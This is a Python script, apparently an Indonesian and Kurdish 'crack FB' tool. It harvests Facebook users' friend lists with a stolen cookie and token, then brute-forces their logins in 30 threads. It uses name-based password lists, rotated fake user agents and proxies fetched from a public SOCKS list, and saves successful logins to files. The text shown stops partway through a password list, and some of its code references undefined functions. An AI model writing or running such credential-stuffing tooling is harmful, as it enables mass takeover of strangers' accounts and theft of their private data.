
#-----------------[ IMPORT-MODULE ]-------------------
## LO GANTENG :V 
## JEECK COOL BOY
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.tree import Tree
from rich import print as cetak
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.panel import Panel as nel
from rich import print as cetak
from rich.columns import Columns as col
from rich import print as prints
from rich import pretty
from rich.text import Text as tekz
###----------[ WARNA PRINT RICH ]---------- ###
M2 = "[#00FF00]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#00FF00]" # KUNING
B2 = "[#00FF00]" # BIRU
P2 = "[#00FF00]" # PUTIH
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#0000FF]"
	colorbapa = random.choice([H2,K2,M2,B2,P2]) 
	color_panel = "#FF0000"
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
proxxy=[]
cokbrut=[]
ses=requests.Session()
princp=[]

for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku) 
	###----------[ User Agent Linux ]---------- ###
    aa='Mozilla/5.0 (X11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Linux x86_64)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(1000):
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android 12; CPH2127 Build/RKQ1.{str(rr(211111,299999))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
    dua  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; RMX3195 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    tiga  = f"Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.{str(rr(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36 wkbrowser 5.0.17 {str(rr(2111111,2999999))} js 5.1.1 newfocus lng=ru"
    empat  = f"Mozilla/5.0 (Linux; Android 9{str(rr(7,12))}; RMX1811) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    lima  = f"Mozilla/5.0 (Linux; Android 12{str(rr(7,12))}; IN2013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    UserAgentss = str(rc([satu,dua,tiga,empat,lima]))
    ugen.append(UserAgentss)
try:
    url_proxy = random.choice([
              "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
])
except:pass
   
#------------------[ PROXIES ]-------------------#
try:
    url = requests.get(f"{url_proxy}").text
    for ikfar in url.splitlines():proxxy.append(ikfar)
except requests.exceptions.ConnectionError:
   prints(nel(f"{P2} XATAKAW DISCONNECT BWA TKAYA CHAWARE BKA",width=80,padding=(0,2),style=f"{color_panel}"));exit()

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # BLACK
m = '\x1b[1;91m' #GREEN +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def renv_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
        
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 
		
		
def clear():
	os.system('clear')
def back():
	login()
	
def none():
	clear()
	prints(nel(f"""\t {color_text} 
       

██████   █████  ██     ██  █████  
██   ██ ██   ██ ██     ██ ██   ██ 
██████  ███████ ██  █  ██ ███████ 
██   ██ ██   ██ ██ ███ ██ ██   ██ 
██   ██ ██   ██  ███ ███  ██   ██



\33[1;92m ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
\33[1;36m TOOL CREATE BY➢  RaWa
\33[1;34m CHENEL➢ NO
\33[1;36m TELGRAM➢ & @l4m_rawa
\33[1;34m VERSION➢1.2
\33[1;32m RAWA is the father of Telegram
\33[1;34m EXPIRED TOOL➢3DAYS
\33[1;92m ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■""")
def banner():
	clear()
	prints(nel(f"""\t {color_text} 
       

██████   █████  ██     ██  █████  
██   ██ ██   ██ ██     ██ ██   ██ 
██████  ███████ ██  █  ██ ███████ 
██   ██ ██   ██ ██ ███ ██ ██   ██ 
██   ██ ██   ██  ███ ███  ██   ██



\33[1;92m ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
\33[1;36m TOOL CREATE BY➢  RaWa
\33[1;34m CHENEL➢ NO
\33[1;36m TELGRAM➢ & @l4m_rawa
\33[1;34m VERSION➢1.2
\33[1;32m RAWA is the father of Telegram
\33[1;34m EXPIRED TOOL➢3DAYS
\33[1;92m ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
                                           
                                           
                                              
"))
# LOGIN
# new cooki 
def login():
		try:
			token = open('.token.txt','r').read()
			kukis = open('.cok.txt','r').read()
			tokenku.append(token)
			try:
				sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':kukis})
				sy2 = json.loads(sy.text)['name']
				sy3 = json.loads(sy.text)['id']
				menu(sy2,sy3)
			except KeyError:
				login_lagi334()
			except requests.exceptions.ConnectionError:
				banner()
				li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
				lo = mark(li, style='red')
				sol().print(lo, style='cyan')
				exit()
		except IOError:
			login_lagi334()

# LOGIN
def login_lagi334():
	try:
		banner()
		___kontol___ = input('[+] Cookies dane : ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":___kontol___}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(___kontol___)
		print('\n RUN AGAIN ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print('%s# COOKIES ESH NAKA / CP ACCOUNT '%(h))
		exit()
# MENU
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('\033[0m╰─ Expired Cookies ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	print('')
	try:cek_data = requests.get("http://ip-api.com/json/").json()
	except:cek_data = {'-'}
	try:MeledakXd = cek_data["isp"]
	except:MeledakXd = {'-'}
	try:MeledakSu = cek_data["city"]
	except:MeledakSu = {'-'}
	info() 
	prints(nel(f'{P2}Login As %s %s{P2}'%((my_id),MeledakSu),width=80,padding=(0,7),style=f"{color_panel}")) 
	prints(nel(f"""{P2}[{color_text}01{P2}]. Crack Public          [{color_text}04{P2}]. Cek Hasil
[{color_text}02{P2}]. Crack Public/Massal   [{color_text}05{P2}]. Cek Tap Yes
[{color_text}03{P2}]. Crack File            [{color_text}00{P2}]. Exit\n[{color_text}06{P2}]. Scrap Set Post""",width=80,padding=(0,7),style=f"{color_panel}"))
	Meledak = input(' Chouse : ')
	print('')
	if Meledak in ['1']:
		dump_publik()
	elif Meledak in ['2']:
		dump_massal()
	elif Meledak in ['3']:
		crack_file()
	elif Meledak in ['4']:
		result()
	elif Meledak in ['5']:
		file_cp()
	elif Meledak in ['6']:
		siu()
	elif Meledak in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cok.txt')
		print('╰─ Successfully Logout+Delete Cookies✓√ ')
		exit()
	else:
		print('╰─ input correctly ')
		back()
def siu():
	start()
	get_data_web()
	akhir()
def error():
	print(f'╰─ Sorry, this feature is still being fixed {x}')
	time.sleep(4)
	back()
def ganti_tema():
		prints(nel(f""" Maaf Tools Ini Sedang Di Perbaiki """,width=80,padding=(0,7),style=f"{color_panel}"))
		sleep(2) 
		back()
# PUBLIC CRACK
def dump_publik():
	try:
		token = open('.token.txt','r').read()
		kukis = open('.cok.txt','r').read()
	except IOError:
		exit()
	bo = random.choice([m,k,h,b,u,p])
	print(f'''{bo}INPUT ID''')
	pil = input(x+m+''+x+' Username/Id : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
		for pi in koh2['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print('')
		bo = random.choice([m,k,h,b,u,p])
		print('\033[32m╭───────────────────────────────╮')
		print(x+m+''+x+f'''\033[32m│{bo} Total Id Collected '''+str(len(id)))
		print('\033[32m╰───────────────────────────────╯')
		setting()
	except requests.exceptions.ConnectionError:
		print('╰─ Internetmu Gak Ada Bodoh')
		exit()
	except (KeyError,IOError):
		print('╰─ Pertemanan Tidak Publick Cookie And Token Anda Busuk')
		exit()

# DUMP ID MASSAL
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('\x1b[1;93m[\x1b[1;92m?\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mHow much targets ? > \x1b[1;93m  '))
	except ValueError:
		print('\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mWorung input !')
		exit()
	if jum<1 or jum>100:
		print('\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mNO Dump ID ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mEnter The ID '+str(yz)+' > \x1b[1;93m')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mNOT WORKING !')
			exit()
	try:
		print('')
		print(f'\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92m[ + ] Total IDS ---> {k}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mNOT WORKING !')
		back()
	except (KeyError,IOError):
		print(f'\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mNOT PUBLIC \33[m(\x1b[1;91mX\33[m)')
		time.sleep(3)
		back()
		
def result():
	print('╰─ 1. Check Cracked CP ')
	print('╰─ 2. Check Cracked OK ')
	print('╰─ 0. EXIT	')
	kz = input('\nHALBZHERA➥: ')
	print('')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('╰─ File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('╰─ Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(''+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0mcekpoint '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0mcekpoint '+x)
			geeh = input('\n╰─ Chouse : ')
			print('')
			try:geh = lol[geeh]
			except KeyError:
				print('╰─ Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('╰─ File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'╰─CP\033[33m {cpkuni[0]}|{cpkuni[1]}\033[0m')
				nocp +=1
			input('\n╰─ Back Enter ')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('╰─ File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('╰─ Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(''+nom+'. '+isi+'\033[32m '+str(len(hem))+' \033[0mSucses '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0mSucses '+x)
			geeh = input('\n╰─ Chouse : ')
			try:geh = lol[geeh]
			except KeyError:
				print('╰─ Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('╰─ File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'\n╰─OK\033[32m {cpkuni[0]}|{cpkuni[1]}|\033[32m{cpkuni[2]}\033[0m')
				nocp +=1
			input('\n╰─ Back Enter ')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('╰─ Pilih Yang Bener Kontol ')
		exit()

def crack_file():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        exit()
    try:
        
        jum = input('╰─ Enter File : ')
        for line in open(jum, 'r').readlines():
            id.append(line.strip())
        print('╰─ ID : '+str(len(id)))
        setting()
    except requests.exceptions.ConnectionError:
            print('╰─ Xat Nya  ')
            exit()
    except (KeyError,IOError):
            print('╰─ Not File')
            time.sleep(3)
            follower()
def setting():
	print('')
	cetak(nel(f"Do You Want Crack Account {M2}old {P2}/{H2} new {P2} / {K2} random {P2} Atau juga {M2}1 {P2}/{H2} 2 {P2}/ {K2}3{P2}",width=80,padding=(0,7),style=f"{color_panel}")) 
	prints(f"""{B2}╭─────────────────────╮   {B2}╭──────────────────╮
{B2}│ {P2}1. CRACK FB OLD {B2}          │{B2}   │      {P2}2. CRACK FB NEW{B2}   │
{B2}╰─────────────────────╯{B2}   ╰──────────────────╯""")
	prints(f"""{B2}╭─────────────────────╮
{B2}│ {P2}3. CRACK FB RANDOM {B2}       │
{B2}╰─────────────────────╯""")
	hu = input('╰─ Choose : ')
	if hu in ['1','old']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['2','new']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','random']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('╰─ input correctly ')
		exit()
		print('')
		
	print('')
	prints(nel(f'''\t{P2}[{H2}1{P2}] Methode Mobile\t[{H2}2{P2}] Methode Free\n\t[{H2}3{P2}] Metode Mbasic"''',width=80,style=f"{color_panel}")) 
	hc = input('[•] Choose  : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('mbasic')
	else:
		method.append('mobile')
	su() 
def su():
	prints(nel(f"\t{P2}[{H2}1{P2}].   321 + 123 + 12345 [ {K2}SLOW (BEST✓) {P2}]\n\t[{H2}2{P2}].   123 + 12345 + 123456 [ {M2}SLOW {P2}]\n\t[{H2}3{P2}].   123 + 1234 + 12345 [{H2} VERY SLOW (BEST✓){P2}]\n\t[{H2}4{P2}].   123 + 12345 [{H2} FAST {P2}]",width=80,style=f"{color_panel}")) 
	ch = input('[•] Choose  : ')
	if ch in ['1','01']:
		mie()
	elif ch in ['2','02']:
		sulap()
	elif ch in ['3','03']:
		passu()
	elif ch in ['4','04']:
		babi()
	else:
		passu()
def mie():
	global prog,des
	print('')
	print(f'OK{x} Save in : {h}OK/%s {x}'%(okc))
	print(f'CP{x} Save in : {k}CP/%s {x}'%(cpc))
	print('') 
	prints(f' AIRPLANE MODE OPEN EVERY 500 ID TEST\n')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append('07500750')
						pwv.append('07700770')
						pwv.append(frs+frs)
						pwv.append(frs+frs+'123')
						pwv.append(frs+frs+'1223')
						pwv.append(frs+frs+'1234')
						pwv.append('zaxozaxo')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'1234567')
						pwv.append(frs+'123456789')
						pwv.append(frs+'1234567890')
						pwv.append(frs+'12')
						pwv.append('11223344')
						pwv.append(frs+'123321')
						
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append('07500750')
						pwv.append('07700770')
						pwv.append(frs+frs)
						pwv.append(frs+frs+'123')
						pwv.append(frs+frs+'1223')
						pwv.append(frs+frs+'1234')
						pwv.append('zaxozaxo')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'1234567')
						pwv.append(frs+'123456789')
						pwv.append(frs+'1234567890')
						pwv.append(frs+'12')
						pwv.append('11223344')
						pwv.append(frs+'123321')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
	print('')
	RODAN = '# WANT TO CHECK THE CRACK RESULT OPTIONS?'
	sol().print(mark(RODAN, style='green'))
	woi = input(x+'['+p+'👽'+x+'] Want to Show Crack Result Options? (y/t) : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		exit()

def passu():
	global prog,des
	print('')
	print(f'OK{x} Save in : {h}OK/%s {x}'%(okc))
	print(f'CP{x} Save in : {k}CP/%s {x}'%(cpc))
	print('') 
	prints(f' AIRPLANE MODE OPEN EVERY 500 ID TEST\n')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append('07500750')
						pwv.append('07700770')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'1234567')
						pwv.append(frs+'12345678')
						pwv.append(frs+'123456789')
						pwv.append(frs+'1234567890')
						pwv.append(frs+'12')
						pwv.append(frs+'1122')
						pwv.append(frs+frs)
						pwv.append(frs+frs+'123')
						pwv.append(frs+frs+'1223')
						pwv.append(frs+frs+'1234')
						pwv.append('zaxozaxo')
						pwv.append(frs+'21')
						pwv.append(frs+'321')
						pwv.append(frs+'4321')
						pwv.append(frs+'54321')
						pwv.append(frs+'654321')
						pwv.append(frs+'7654321')
						pwv.append(frs+'87654321')
						pwv.append(frs+'987654321')
						pwv.append(frs+'332211')
						pwv.append('1234'+frs)
						pwv.append('12345'+frs)
						pwv.append('123456'+frs)
						pwv.append('1234567'+frs)
						pwv.append('12345678'+frs)
						pwv.append('112233'+frs)
						pwv.append('11223344'+frs)
						pwv.append('11223345'+frs)
						pwv.append('11223344')
						pwv.append('11223'+frs)
						pwv.append('1122334')
						pwv.append('12334'+frs)
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+frs)
						pwv.append(frs+frs+'123')
						pwv.append(frs+frs+'1223')
						pwv.append(frs+frs+'1234')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'123456789')
						pwv.append(frs+'1234567890')
						pwv.append(frs+'12')
						pwv.append('zaxozaxo')
						pwv.append(frs+'112233')
						pwv.append(frs+'1122')
						pwv.append(frs+'321')
						pwv.append(frs+'54321')
						pwv.append('1234567'+frs)
						pwv.append('123456'+frs)
						pwv.append('1233'+frs)
						pwv.append('12234'+frs)
						pwv.append('1122334455'+frs)
						pwv.append(frs+'11223')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
		print('')
	print('')
	RODAN = '# WANT TO CHECK THE CRACK RESULT OPTIONS?'
	sol().print(mark(RODAN, style='green'))
	woi = input(x+'['+p+'👽'+x+'] Want to Show Crack Result Options? (y/t) : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		exit()

def passwrd():
	os.system('clear')
	print(logo)
	print('\033[0;1m[ \033[31;1m+ \033[0;1m] HAMU IDEAKAN: \033[32m'+str(len(id))) 
	print('\033[0;1m[ \033[31;1m+ \033[0;1m] HACK DASTE PEKRD \033[0;1m( \033[32mBOSTA W BBENA \033[0;1m)')
	print('\033[0;1m[ \033[31;1m+ \033[0;1m] BO WASTANDNEY TOOL \033[0;1m( \033[32mCTRL+Z \033[0;1m)')
	print('\033[1;91m-------------------------------------------')
	with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'2006')
						pwv.append(frs+'2005')
						pwv.append(frs+'2004')
						pwv.append(frs+'2003')
						pwv.append(frs+'2002')
						pwv.append(frs+'2001')
						pwv.append(frs+'2000')
						pwv.append(frs+'1999')
						pwv.append(frs+'1998')
						pwv.append(frs+'1997')
						pwv.append(frs+'1996')
						pwv.append(frs+'1995')
						pwv.append(frs+'1994')
						pwv.append(frs+'1993')
						pwv.append(frs+'1992')
						pwv.append(frs+'1991')
						pwv.append(frs+'1990')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'2006')
						pwv.append(frs+'2005')
						pwv.append(frs+'2004')
						pwv.append(frs+'2003')
						pwv.append(frs+'2002')
						pwv.append(frs+'2001')
						pwv.append(frs+'2000')
						pwv.append(frs+'1999')
						pwv.append(frs+'1998')
						pwv.append(frs+'1997')
						pwv.append(frs+'1996')
						pwv.append(frs+'1995')
						pwv.append(frs+'1994')
						pwv.append(frs+'1993')
						pwv.append(frs+'1992')
						pwv.append(frs+'1991')
						pwv.append(frs+'1990')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] CRACK Fb by stand —> RODAN 😎[cyan] ✓[white] '))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('[•] Lanjut Crack Kembali ( Y/t ) ? ')
	woi = input('[•] Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}>>{k} Good By RODAN{x} << ')
		time.sleep(2)
		exit()

def sulap():
	global prog,des
	print('')
	print(f'╰─ {h}OK{x} Save in : {h}OK/%s {x}'%(okc))
	print(f'╰─ {k}CP{x} Save in : {k}CP/%s {x}'%(cpc))
	print(f'╰─ AIRPLANE MODE OPEN EVERY 500 ID TEST\n')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = ['1234554321','1234567890','12345678','1122334455','112233445566','123456']
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+frs)
						pwv.append(frs+frs+'123')
						pwv.append(frs+frs+'1223')
						pwv.append(frs+frs+'1234')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'1234567')
						pwv.append(frs+'12345678')
						pwv.append(frs+'123456789')
						pwv.append(frs+'1234567890')
						pwv.append(frs+'12')
						pwv.append(frs+'1122')
						
						pwv.append(frs+'21')
						pwv.append(frs+'321')
						pwv.append(frs+'4321')
						pwv.append(frs+'54321')
						pwv.append(frs+'654321')
						pwv.append(frs+'7654321')
						pwv.append(frs+'87654321')
						pwv.append(frs+'987654321')
						pwv.append(frs+'332211')
						pwv.append('zaxozaxo')
						pwv.append('1234'+frs)
						pwv.append('12345'+frs)
						pwv.append('123456'+frs)
						pwv.append('1234567'+frs)
